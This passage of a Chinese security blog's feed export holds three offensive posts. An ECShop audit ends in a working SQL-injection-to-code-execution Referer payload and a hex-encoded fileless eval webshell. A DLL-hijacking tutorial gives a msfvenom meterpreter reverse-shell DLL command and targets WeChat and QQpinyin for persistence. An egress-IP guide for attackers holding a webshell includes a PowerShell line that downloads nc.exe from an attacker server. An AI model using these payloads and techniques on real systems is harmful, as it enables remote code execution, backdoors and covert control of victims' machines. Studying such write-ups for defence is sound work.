class="string">'~(&lt;\?(?:\w+|=)?|\?&gt;|language\s*=\s*[\"\']?php[\"\']?)~is'</span>, $source, $sp_match))</span><br><span class="line">        &#123;</span><br><span class="line">            $sp_match[<span class="number">1</span>] = array_unique($sp_match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                $source = str_replace($sp_match[<span class="number">1</span>][$curr_sp],<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>,$source);</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="keyword">for</span> ($curr_sp = <span class="number">0</span>, $for_max2 = count($sp_match[<span class="number">1</span>]); $curr_sp &lt; $for_max2; $curr_sp++)</span><br><span class="line">            &#123;</span><br><span class="line">                 $source= str_replace(<span class="string">'%%%SMARTYSP'</span>.$curr_sp.<span class="string">'%%%'</span>, <span class="string">'&lt;?php echo \''</span>.str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, $sp_match[<span class="number">1</span>][$curr_sp]).<span class="string">'\'; ?&gt;'</span>.<span class="string">"\n"</span>, $source);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> preg_replace(<span class="string">"/&#123;([^\&#125;\&#123;\n]*)&#125;/e"</span>, <span class="string">"\$this-&gt;select('\\1');"</span>, $source);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>在往里面跟，最终是调用了<code>$this-&gt;select()</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($tag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tag = stripslashes(trim($tag));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($tag))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&#123;&#125;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'*'</span> &amp;&amp; substr($tag, <span class="number">-1</span>) == <span class="string">'*'</span>) <span class="comment">// 注释部分</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($tag&#123;<span class="number">0</span>&#125; == <span class="string">'$'</span>) <span class="comment">// 变量</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            if(strpos($tag,"'") || strpos($tag,"]"))</span></span><br><span class="line"><span class="comment">//            &#123;</span></span><br><span class="line"><span class="comment">//                 return '';</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&lt;?php echo '</span> . <span class="keyword">$this</span>-&gt;get_val(substr($tag, <span class="number">1</span>)) . <span class="string">'; ?&gt;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>这里我们能看到曙光了，就是如果第一位是<code>$</code>的话，就返回给_eval函数一个带有php标签的代码，但是还是会经过一个<code>get_val()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_val</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'['</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $val = preg_replace(<span class="string">"/\[([^\[\]]*)\]/eis"</span>, <span class="string">"'.'.str_replace('$','\$','\\1')"</span>, $val);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'|'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $moddb = explode(<span class="string">'|'</span>, $val);</span><br><span class="line">            $val = array_shift($moddb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($val))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strpos($val, <span class="string">'.$'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $all = explode(<span class="string">'.$'</span>, $val);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($all <span class="keyword">AS</span> $key =&gt; $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $all[$key] = $key == <span class="number">0</span> ? <span class="keyword">$this</span>-&gt;make_var($val) : <span class="string">'['</span>. <span class="keyword">$this</span>-&gt;make_var($val) . <span class="string">']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $p = implode(<span class="string">''</span>, $all);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $p = <span class="keyword">$this</span>-&gt;make_var($val);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>当传入的变量没有.$时，调用<code>$this-&gt;make_var</code>，看看make_var<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">            &#123;</span><br><span class="line">                $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">            &#125;</span><br><span class="line">            $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">'.'</span>, $val);</span><br><span class="line">            $_var_name = array_shift($t);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$_var_name]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$_var_name]))</span><br><span class="line">            &#123;</span><br><span class="line">                $_var_name = <span class="keyword">$this</span>-&gt;_patchstack[$_var_name];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($_var_name == <span class="string">'smarty'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                 $p = <span class="keyword">$this</span>-&gt;_compile_smarty_ref($t);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                $p = <span class="string">'$this-&gt;_var[\''</span> . $_var_name . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> ($t <span class="keyword">AS</span> $val)</span><br><span class="line">            &#123;</span><br><span class="line">                $p.= <span class="string">'[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>可以看到最终返回的<code>$p</code>变成了<code>$p = &#39;$this-&gt;_var[\&#39;&#39; . $_var_name . &#39;\&#39;]&#39;</code><br>往回看，我们的select函数return的值就变成了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">'  $val  '</span>];<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后结合上面进入函数的条件，我们可以构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>然后因为不满足fetch_str的正则，加一个<code>/**/</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$abc<span class="string">'];echo phpinfo/**/();//&#125;</span></span><br></pre></td></tr></table></figure></p><p>然后就是利用SQL注入漏洞，让<code>$position_style</code>等于我们的payload了</p><p>最终payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">"num"</span>;s:<span class="number">110</span>:<span class="string">"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -"</span>;s:<span class="number">2</span>:<span class="string">"id"</span>;s:<span class="number">4</span>:<span class="string">"' /*"</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p><p>简单来说就是利用<code>$arr[&#39;id&#39;]</code>和<code>$arr[&#39;num&#39;]</code> 注释掉中间的 <code>order by 和 limit</code>，强制执行UNION，带入<code>position_style</code></p><p>和之前的APT攻击一样，可以直接带入一个无文件Webshell:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d</span></span><br><span class="line"><span class="comment"># unhex</span></span><br><span class="line">&#123;$a<span class="string">'];assert(base64_decode('</span>QEVWQUwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ05veCddKSk7<span class="string">'));$a['</span><span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64_decode</span></span><br><span class="line">@<span class="keyword">EVAL</span>(base64_decode($_POST[<span class="string">'Nox'</span>]));</span><br></pre></td></tr></table></figure></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>Ecshop 还是见的比较多，用途也比较广，特别是现在各类区块链的网站，用的还是比较多</p><p>3.x同样也可以rce，只是需要精心构造payload，因为需要绕过waf，但是404的师傅说其实将union select通过两个参数传递进去，一个参数传递一个关键字，中间的可以使用<code>/**/</code>注释掉，这样就不会触发WAF了23333</p><h2 id="0x05-Links"><a href="#0x05-Links" class="headerlink" title="0x05 Links"></a>0x05 Links</h2><p><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">https://paper.seebug.org/695/</a><br><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">https://xz.aliyun.com/t/2689</a><br><a href="https://www.seebug.org/vuldb/ssvid-97343" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97343</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-27 00:03:02&lt;br&gt;&lt;img src=&quot;/wallpaper/[60268880.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="代码审计" scheme="http://patrilic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>DLL Hijacking</title>
    <link href="http://patrilic.top/2019/08/23/DLL%20Hijacking/"/>
    <id>http://patrilic.top/2019/08/23/DLL Hijacking/</id>
    <published>2019-08-23T04:18:04.000Z</published>
    <updated>2019-08-27T18:08:49.932Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Authro: Patrilic<br>@Time: 2019-08-23 12:18:04<br><img src="/wallpaper/75773182_p0.jpg" alt></p></blockquote><h2 id="0x00-Introduce"><a href="#0x00-Introduce" class="headerlink" title="0x00 Introduce"></a>0x00 Introduce</h2><p>DLL Hijacking， 顾名思义，就是DLL劫持，利用DLL劫持，可以通过调用恶意dll文件来执行shellcode。<br>所以，DLL是什么呢？<br><a href="https://zh.wikipedia.org/wiki/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93" target="_blank" rel="noopener">维基百科</a></p><p>简单来说，exe文件本身不需要很多函数，而是去调用DLL文件中的函数，当进程运行到需要调用时，就去从文件中调用对应的函数，然后当我们能够中间插入自己的DLL并想办法让程序运行我们的DLL时，就造成了劫持。</p><h2 id="0x01-DLL-Hijacking"><a href="#0x01-DLL-Hijacking" class="headerlink" title="0x01 DLL Hijacking"></a>0x01 DLL Hijacking</h2><p><code>DLL hijacking</code> 在 CWE上又名： <code>Untrusted Search Path Vulnerability</code><br><a href="https://cwe.mitre.org/data/definitions/426.html" target="_blank" rel="noopener">https://cwe.mitre.org/data/definitions/426.html</a></p><p>dll劫持通过利用DLL的加载顺序，让我们的恶意dll在正常的dll前面加载，就可以进行劫持了</p><h3 id="DLL-Search-Order"><a href="#DLL-Search-Order" class="headerlink" title="DLL Search Order"></a>DLL Search Order</h3><p>下面来看一下dll的加载顺序：<br>官方文档： <a href="https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order</a></p><p>应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。</p><p>然后这里有两个前提条件，对以下两种情况的DLL，程序不会查找，而是直接引用</p><ol><li>对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。）</li><li>如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs。<br><img src="/DLL Hijacking.resources/FE85E1B9-4C3C-40C2-8680-64BBCF2D9714.png" alt="0c6f2cf4e21cd827fdff57790b3a5982"></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.程序所在目录</span><br><span class="line">2.程序加载目录（SetCurrentDirectory）</span><br><span class="line">3.系统目录即 SYSTEM32 目录</span><br><span class="line">4.16位系统目录即 SYSTEM 目录</span><br><span class="line">5.Windows目录</span><br><span class="line">6.PATH环境变量中列出的目录</span><br></pre></td></tr></table></figure><p>我们使用<code>ProcessMonitor</code>来监控进程<br>可以通过👉<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon</a>下载</p><h3 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it"></a>Do it</h3><p>这里使用自动化的审计工具进行DLL劫持分析<br>推荐Windows下使用<code>Dll Hijack Auditor</code></p><p>我们以Vc++6.0编辑器为例<br><img src="/DLL Hijacking.resources/D23C6ACE-1F0D-498E-BF55-353C064EEAAF.png" alt="fec186d523049fcb19d40672cee5dd97"></p><p>生成报告</p><p><img src="/DLL Hijacking.resources/54857F75-C5A0-48E1-9CEF-0EDA6FA7CA1A.png" alt="d09587368427f553d0cb26464aed4cb3"><br>我们可以看到存在dll可以劫持</p><p>然而这个我发现，好像并不能使用2333<br>那要怎么手动寻找呢？反正DLL的加载，我们只需要从程序已经加载的DLL列表中，查找在“KnownDLLs注册表项”中不存在的DLL。<br>然后将恶意dll放在程序当前目录即可</p><p>然后还有两个利器：</p><blockquote><p>Robber <a href="https://github.com/MojtabaTajik/Robber" target="_blank" rel="noopener">https://github.com/MojtabaTajik/Robber</a><br>Rattler <a href="https://github.com/sensepost/rattler" target="_blank" rel="noopener">https://github.com/sensepost/rattler</a></p></blockquote><h3 id="Hack-it"><a href="#Hack-it" class="headerlink" title="Hack it"></a>Hack it</h3><p>用倾旋师傅之前找到的<code>QQpinyin</code>来做一个演示<br><a href="https://payloads.online/archivers/2018-06-09/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-06-09/1</a></p><h4 id="Msf"><a href="#Msf" class="headerlink" title="Msf"></a>Msf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=182.168.0.101 LPORT=10001 -f dll &gt; ntmarta.dll</span><br></pre></td></tr></table></figure><p><img src="/DLL Hijacking.resources/9FB73E4A-74F4-4249-BD44-673EEE8A9EEC.png" alt="a0ea9b499f1498e7e373e0b512242577"></p><h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p><img src="/DLL Hijacking.resources/6D6847BA-6F9A-4355-AE3D-363C27F39C9F.png" alt="278aa9975763a654cec4763eb5ab3792"><br>同样的操作，反弹beacon<br><img src="/DLL Hijacking.resources/1ED21E64-7A9E-410D-A239-50D5CDD5D592.png" alt="9f382d5e297f99185e2a16bd456773b4"></p><h3 id="Weixin-DLL-Hijacking"><a href="#Weixin-DLL-Hijacking" class="headerlink" title="Weixin DLL Hijacking"></a>Weixin DLL Hijacking</h3><p>微信PC版相信还是用的比较多的，也常常能在一些公司电脑上看到，所以还是比较有意义的<br><img src="/DLL Hijacking.resources/3A39C9B1-24B6-4F0A-9F6E-BD1889CAAAA7.png" alt="93bf7e673548524925a9b63f75a3cf5a"><br>当然，ProcessMonitor也能看到<br><img src="/DLL Hijacking.resources/12CDE5AD-5981-4771-8F6D-8082FDF95749.png" alt="d4f968dca3dd7e6f373693bcfc79fc31"><br>构造payload劫持即可<br><img src="/DLL Hijacking.resources/FCEBA963-4F3C-4F21-A968-E08EFC4741B6.png" alt="f17d81c5fc84f728b4f876ed68c2e51d"></p><h2 id="0x02-Summary"><a href="#0x02-Summary" class="headerlink" title="0x02 Summary"></a>0x02 Summary</h2><p>DLL劫持也是老的不行的一个漏洞了，但是在进行维权，持续渗透的方面，一直都比较厉害。<br>真实环境下，我们可以制作一个加密的DLL文件，从DLLMain里进行调用，回弹shell的同时，也完成程序的正常功能，特别是针对用户常用软件的DLL劫持～虚浮了</p><h2 id="0x03-Other-to-Learn"><a href="#0x03-Other-to-Learn" class="headerlink" title="0x03 Other to Learn"></a>0x03 Other to Learn</h2><p><a href="https://www.52pojie.cn/thread-830796-1-1.html" target="_blank" rel="noopener">一种通用DLL劫持技术研究</a><br><a href="https://www.cnblogs.com/h2zZhou/p/8601375.html" target="_blank" rel="noopener">老树开新花：DLL劫持漏洞新玩法</a><br><a href="http://www.anquan.us/static/drops/tips-13238.html" target="_blank" rel="noopener">深入解析DLL劫持漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Authro: Patrilic&lt;br&gt;@Time: 2019-08-23 12:18:04&lt;br&gt;&lt;img src=&quot;/wallpaper/75773182_p0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="http://patrilic.top/categories/ATT-CK/"/>
    
    
      <category term="DLL Hijacking" scheme="http://patrilic.top/tags/DLL-Hijacking/"/>
    
  </entry>
  
  <entry>
    <title>寻找内网出口ip</title>
    <link href="http://patrilic.top/2019/08/20/%E5%AF%BB%E6%89%BE%E5%86%85%E7%BD%91%E5%87%BA%E5%8F%A3ip/"/>
    <id>http://patrilic.top/2019/08/20/寻找内网出口ip/</id>
    <published>2019-08-20T12:14:23.000Z</published>
    <updated>2020-03-14T15:07:54.125Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-20 20:14:23<br><img src="/wallpaper/30597.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>晚上吃了饭回酒店，一觉睡醒，发现有个师傅问我windows机器只有webshell怎么找内网的出口ip，想了想确实没总结过这个东西（主要是平时都是直接反弹个shell了..）</p><p>仔细想想，其实挺好玩的，然后就和几个师傅讨论了下，感觉大概就下面这几种方式，如果有不足请师傅补充～</p><h2 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h2><p>Linux 由于基本自带 <code>curl</code>和<code>wget</code>,<code>telnet</code>命令，所以还是比较简单的</p><h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl cip.cc</span><br></pre></td></tr></table></figure><p><img src="/如何寻找内网出口ip.resources/F90295F8-F123-4CB2-B957-05DD554F0EA4.png" alt="e6ee0f98f7abc8edc984f243e1c42370"></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet cip.cc</span><br></pre></td></tr></table></figure><p><img src="/如何寻找内网出口ip.resources/64B82503-12DC-42B1-AF78-AD72FA1B84F8.png" alt="1ba6f6948d7f30c013c7a0e680e26d18"></p><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>利用nc监听端口，然后linux端使用wget命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget xxx.xxx.xxx.xxx:90</span><br></pre></td></tr></table></figure><p><img src="/如何寻找内网出口ip.resources/B7E37635-F0C6-4083-9EE4-E925957C12B1.png" alt="34f53887bd6dfad3b33469c64b746c45"></p><h3 id="ping（linux-windows通用）"><a href="#ping（linux-windows通用）" class="headerlink" title="ping（linux windows通用）"></a>ping（linux windows通用）</h3><p>结合ceye</p><p>直接执行ping命令，走<code>DNS Query</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping metzl4.ceye.io</span><br></pre></td></tr></table></figure></p><p><img src="/如何寻找内网出口ip.resources/B51E2419-7B28-4CDE-8B1B-DAF2924545D1.png" alt="f3cc55ed09188d082f807b70cbbb4b37"></p><h2 id="0x02-Windows"><a href="#0x02-Windows" class="headerlink" title="0x02 Windows"></a>0x02 Windows</h2><h3 id="WebClient"><a href="#WebClient" class="headerlink" title="WebClient"></a>WebClient</h3><p>和<code>Wget</code>一个原理，我们平时经常会使用下面的语句进行文件传输<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">"http://xxx.xxx.xxx.xxx/nc.exe"</span>,<span class="string">"nc.exe"</span>)</span><br></pre></td></tr></table></figure></p><p>同样，只要是走http通道，那就肯定可以和我们的vps进行连接，就可以拿到出网ip了</p><p><img src="/如何寻找内网出口ip.resources/EB7707FA-E591-4520-9874-DE0D281F4FBF.png" alt="2c06dc63c41d0c1d698e9d1fb698bf22"></p><p><img src="/如何寻找内网出口ip.resources/8A3B4E42-2050-418E-A08A-E5E0A31C3FB4.png" alt="3be76eb775caa75eea974875b0fe5c59"></p><h3 id="WebRequest"><a href="#WebRequest" class="headerlink" title="WebRequest"></a>WebRequest</h3><p><code>Powershell version &gt; 3.0</code> 就可以使用Windows上的wget了2333</p><p>查看Powershell版本：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Host</span></span><br><span class="line"><span class="variable">$PSVersionTable</span>.PSVersion</span><br></pre></td></tr></table></figure></p><p>官方文档：<br><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1</a><br><img src="/如何寻找内网出口ip.resources/86CB25E8-75F4-4FFE-8FA4-85DE4BA4ED66.png" alt="c36f05c4f3fda64d50bdd311c14bf9c4"></p><p>Usage:<br><img src="/如何寻找内网出口ip.resources/1717FC59-8205-4E3F-A1E2-DD86447ECDCE.png" alt="a1dcebf74d84473ab952f25e9266cfb4"></p><p><img src="/如何寻找内网出口ip.resources/64EE7E2C-241F-4575-89F6-7A1BBC891B6F.png" alt="de63fcec3f88e9e2d2b2622791d1c748"></p><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p><code>certutil</code>这个东西被AV监控得太死了..<br><img src="/如何寻找内网出口ip.resources/933199E4-E637-48E8-AFA8-4212D731755B.png" alt="fdedf94858c856e6560d27dfcb634d6e"><br><img src="/如何寻找内网出口ip.resources/BE759B80-FA21-4F1B-88E9-5749FD816B2D.png" alt="cdbdb7eb2e69f14fa211e114b88dd701"></p><p>实战用的话也需要一定的绕过技巧</p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>start命令直接会开启一个ie进程去访问目标url<br><img src="/如何寻找内网出口ip.resources/351FF26E-1CED-4A96-ACC9-CBB71041B898.png" alt="a7015efe5a0ceeddc7a78797d42d364a"></p><p><img src="/如何寻找内网出口ip.resources/53FA6E22-78DB-439F-B51D-121D8C76FB81.png" alt="65be4f74982d1bcdf0b6e0545a21bf96"></p><p>当然，需要注意用户，别给别人远程桌面开个ie啥的</p><h3 id="…"><a href="#…" class="headerlink" title="…"></a>…</h3><p>还有其他的姿势，反正我觉得只要是可以用各种东西访问外面的，都可以拿到真实的出口ip，大哥们也可以研究下</p><h2 id="0x03-反弹shell"><a href="#0x03-反弹shell" class="headerlink" title="0x03 反弹shell"></a>0x03 反弹shell</h2><p>既然有Webshell了，最常见的方式也就是反弹个shell啥的，这里就不多讲了，os shell,meterpreter啥的都ok</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个问题也是突发奇想，好像具体的意义也不是很大，主要是在想如何规避AV和不通过第三方应用和写文件的情况下进行一个ip获取～师傅们见谅</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-20 20:14:23&lt;br&gt;&lt;img src=&quot;/wallpaper/30597.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
